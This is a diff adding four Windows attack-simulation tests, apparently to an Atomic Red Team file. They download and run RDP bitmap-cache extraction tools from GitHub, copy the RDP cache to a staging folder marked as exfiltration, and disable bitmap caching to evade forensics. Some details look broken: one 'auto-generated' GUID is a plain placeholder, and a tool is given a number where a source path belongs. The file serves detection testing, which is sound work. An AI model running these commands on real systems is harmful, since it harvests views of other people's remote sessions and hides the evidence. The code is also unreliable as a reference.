@@ -96,7 +96,6 @@ atomic_tests:
     cleanup_command: |
       rm #{output_file}
     name: sh
-
 - name: Capture Linux Desktop using Import Tool
   auto_generated_guid: 9cd1cccb-91e4-4550-9139-e20a586fcea1
   description: |
@@ -210,3 +209,85 @@ atomic_tests:
       reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f
     name: powershell
     elevation_required: true
+- name: RDP Bitmap Cache Extraction via BMC-Tools
+  auto_generated_guid: 6c28d27f-9c09-40e1-fbda-3d3f9453716c
+  description: |
+    Simulates an attacker extracting the RDP bitmap cache to reconstruct screenshots of previous RDP sessions.
+    Uses the popular public tool 'bmc-tools' (ANSSI). 
+    The RDP session must have been initiated from this client machine to a remote server for cache to exist.
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $url = 'https://github.com/ANSSI-FR/bmc-tools/releases/download/v1.0/bmc-tools.exe'
+      $toolsDir = "$env:TEMP\bmc-tools.exe"
+      $outputDir = "$env:TEMP\rdp_screens"
+      
+      Invoke-WebRequest -Uri $url -OutFile $toolsDir
+      
+      # Run bmc-tools to export cache
+      & $toolsDir -s 600 -b -d $outputDir
+    cleanup_command: |
+      Remove-Item "$env:TEMP\bmc-tools.exe" -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\rdp_screens" -Recurse -Force -ErrorAction SilentlyContinue
+
+- name: RDP Bitmap Cache Stitching via RDPCacheStitcher
+  auto_generated_guid: 9a3c1c72-8f12-4c6e-931b-27c1a2e3f4b5
+  description: |
+    Alternative method using RDPCacheStitcher to reconstruct RDP cache files into viewable PNGs.
+    Downloads the tool and executes it against the local RDP cache directory.
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $url = 'https://github.com/Teece/RDPCacheStitcher/releases/download/v1.0.0/RDPCacheStitcher.exe'
+      $stitcher = "$env:TEMP\RDPCacheStitcher.exe"
+      $cachePath = "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache"
+      $output = "$env:TEMP\RDP_stitcher_output"
+
+      Invoke-WebRequest -Uri $url -OutFile $stitcher
+      
+      # Execute Stitcher
+      & $stitcher -p $cachePath -o $output
+    cleanup_command: |
+      Remove-Item "$env:TEMP\RDPCacheStitcher.exe" -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\RDP_stitcher_output" -Recurse -Force -ErrorAction SilentlyContinue
+
+- name: Exfiltrate RDP Cache Directory (Living off the Land)
+  auto_generated_guid: 12f5c942-3e21-4a1b-9f21-789a2b1c4d3e
+  description: |
+    Simulates an attacker manually copying the RDP cache folder for offline analysis using Robocopy.
+    This avoids dropping new binaries but generates suspicious file access events.
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $source = "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache"
+      $dest = "$env:TEMP\RDP_Cache_Exfil"
+      
+      # Robocopy /E copies subdirectories, including empty ones
+      # Robocopy returns distinct exit codes for success (1), so we suppress errors to prevent Atomic failure alerts on success
+      try { robocopy $source $dest /E } catch { }
+    cleanup_command: |
+      Remove-Item "$env:TEMP\RDP_Cache_Exfil" -Recurse -Force -ErrorAction SilentlyContinue
+
+- name: Disable RDP Bitmap Caching (Defense Evasion)
+  auto_generated_guid: 52a1b5c0-1234-5678-90ab-cdef12345678
+  description: |
+    Disables RDP Bitmap Caching via the Registry to prevent future forensic artifacts from being created.
+    Attackers may do this after exfiltration to leave no traces of future sessions.
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Set-ItemProperty -Path "HKCU:\Software\Microsoft\Terminal Server Client" -Name "DisableBitmapCaching" -Type DWORD -Value 1 -Force
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Terminal Server Client" -Name "DisableBitmapCaching" -ErrorAction SilentlyContinue
